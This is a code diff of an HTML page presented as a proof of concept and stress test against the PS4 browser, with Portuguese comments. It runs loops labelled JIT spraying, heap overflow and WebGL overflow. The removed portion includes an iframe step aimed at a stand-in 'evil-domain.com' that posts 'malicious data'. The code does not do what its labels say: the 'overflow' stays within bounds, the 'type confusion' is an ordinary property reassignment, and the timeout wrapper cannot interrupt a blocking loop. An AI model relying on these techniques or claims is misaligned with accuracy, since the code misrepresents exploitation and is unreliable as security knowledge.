@@ -2,82 +2,113 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Extreme Browser Attack PoC</title>
+    <title>PS4 Extreme Browser Stress Tests</title>
     <style>
         body { font-family: monospace; background: black; color: lime; padding: 20px; }
         #log { white-space: pre-wrap; }
-        button { background: red; color: white; padding: 10px 20px; margin: 10px 0; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h1>PS4 Extreme Browser Attack PoC</h1>
-    <button onclick="runAllTests()">Run All Aggressive Tests</button>
-    <div id="log"></div>
+<h1>PoC - PS4 Extreme Browser Stress Tests</h1>
+<div id="log"></div>
 
-    <script>
-        function log(msg) {
-            document.getElementById('log').textContent += msg + "\n";
-        }
+<script>
+// Função para logar a saída na tela
+function log(msg) {
+    document.getElementById('log').textContent += msg + "\n";
+}
 
-        async function runAllTests() {
-            log("[+] Starting aggressive attack chain...");
+// Delay auxiliar
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
 
-            // Test 1: JIT Spraying - Create type confusion
-            log("[1] JIT Spraying (Type Confusion)...");
-            try {
-                for (let i = 0; i < 100000; i++) {
-                    let obj = {};
-                    obj.prop = 123; // Create confusion between different types
-                    obj.prop = "string" + i; // Overwrite with string
-                    obj.prop = { "key": i }; // Overwrite with object
-                }
-                log("[!] JIT spraying completed.");
-            } catch (e) {
-                log("[!!] Exception on JIT spraying: " + e);
-            }
+// Função para rodar um teste com timeout
+async function runWithTimeout(fn, name, timeout=5000) {
+  log(`[*] Running ${name} with timeout ${timeout}ms`);
+  let finished = false;
+  fn().then(() => finished = true).catch(e => log(`[!!] ${name} error: ${e}`));
+  let start = performance.now();
+  while (!finished) {
+    if (performance.now() - start > timeout) {
+      log(`[!!!] ${name} timed out! Aborting test to keep browser alive.`);
+      return;
+    }
+    await delay(100);
+  }
+  log(`[*] ${name} completed.`);
+}
 
-            // Test 2: WebGL Buffer Overflow
-            log("[2] WebGL Buffer Overflow...");
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const buffer = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1e6), gl.STATIC_DRAW);
-                log("[!] WebGL Buffer Overflow test passed.");
-            } catch (e) {
-                log("[!!] Exception on WebGL Buffer Overflow: " + e);
-            }
+// Função para verificar corrupção de memória
+function verifyCorruption() {
+  const ta = new Float64Array(1);
+  ta[0] = 1.234;
+  if (!Number.isFinite(ta[0])) log("[CORRUPT] Detected NaN after stress!");
+  else log("[CLEAN] No corruption detected.");
+}
 
-            // Test 3: Heap Overflow - ArrayBuffer manipulation
-            log("[3] Heap Overflow via ArrayBuffer...");
-            try {
-                let hugeBuffer = new ArrayBuffer(0x10000000); // 256MB buffer
-                let uint8 = new Uint8Array(hugeBuffer);
-                for (let i = 0; i < uint8.length; i++) {
-                    uint8[i] = i % 255;
-                }
-                log("[!] Heap overflow attack completed.");
-            } catch (e) {
-                log("[!!] Exception on Heap Overflow: " + e);
-            }
+// Função para realizar JIT Spraying
+async function jitSpray() {
+  log("[*] Starting JIT spraying...");
+  for (let i = 0; i < 100000; i++) {
+    // Forçar comportamento inesperado, tipos misturados
+    let obj = {};
+    obj.prop = 123;  // Forçar confusão de tipo
+    obj.prop = "abc";  // Alterando o tipo
+    obj.prop = 456;  // Voltar ao número
+  }
+  verifyCorruption();  // Verificar se há corrupção após a execução
+}
 
-            // Test 4: SOP Bypass with postMessage (Cross-origin)
-            log("[4] SOP Bypass via postMessage...");
-            try {
-                let iframe = document.createElement('iframe');
-                iframe.src = "https://evil-domain.com"; // This should be a different domain
-                document.body.appendChild(iframe);
-                iframe.onload = function() {
-                    iframe.contentWindow.postMessage('malicious data', "*");
-                };
-                log("[!] SOP Bypass attempted with postMessage.");
-            } catch (e) {
-                log("[!!] Exception on SOP Bypass: " + e);
-            }
+// Função para teste de Heap Overflow
+async function heapOverflow() {
+  log("[*] Starting Heap Overflow test...");
+  let buffer = new ArrayBuffer(0x2000000); // Buffer grande para overflows
+  let view = new DataView(buffer);
+  try {
+    for (let i = 0; i < buffer.byteLength; i++) {
+      view.setUint8(i, 0x41); // Enviar dados que são "A"
+    }
+    log("[!] Heap overflow test completed.");
+  } catch (e) {
+    log("[!!] Exception during heap overflow: " + e);
+  }
+  verifyCorruption();
+}
 
-            log("[+] Aggressive attack chain completed.");
-        }
-    </script>
+// Função para teste de WebGL (tentando vazamento de memória)
+async function webGLTest() {
+  log("[*] Starting WebGL Test...");
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl');
+    gl.createBuffer(999999999); // Alocação excessiva
+    log("[!] WebGL test completed.");
+  } catch (e) {
+    log("[!!] Exception during WebGL test: " + e);
+  }
+}
+
+// Função para executar todos os testes de uma vez
+async function runAllTests() {
+  log("[+] Starting extreme PS4 browser tests...");
+  
+  await runWithTimeout(jitSpray, "JIT Spraying", 5000);
+  await runWithTimeout(heapOverflow, "Heap Overflow", 5000);
+  await runWithTimeout(webGLTest, "WebGL Excessive Allocation", 5000);
+  
+  log("[+] All tests executed.");
+}
+
+// Inicialização dos testes
+(async function(){
+  try {
+    await runAllTests();
+  } catch (fatal) {
+    log("[FATAL] Uncaught exception: " + fatal);
+  }
+})();
+</script>
+
 </body>
 </html>
